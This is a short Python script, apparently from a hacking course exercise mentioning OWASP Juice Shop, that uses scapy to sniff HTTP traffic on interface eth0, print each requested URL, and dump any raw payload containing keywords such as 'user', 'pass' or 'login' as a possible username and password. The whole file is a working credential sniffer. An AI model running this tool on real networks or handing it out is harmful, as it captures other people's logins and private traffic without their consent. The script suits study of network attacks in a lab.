#/usr/bin/env python
# Rebuild - Combine both functions
import scapy.all as scapy
from scapy.layers import http

keywords = ["email", "user", "admin", "name", "pass", "login", "name", "word"]
# might be worth searching for "@"

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
  if packet.haslayer(scapy.Raw):
    load = str(packet[scapy.Raw].load)
    for keyword in keywords:
        if keyword in load.lower():
            return load

def process_sniffed_packet(packet):
    # print(packet.show()) # This will give us a breakdown of the packet from
    # OWASP juice shop on local host but it seems pretty edge case.
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Requeset for URL: " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Keyword Found in load.  Possible username/password: ")
            print(login_info + "\n\n")

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

sniff("eth0")

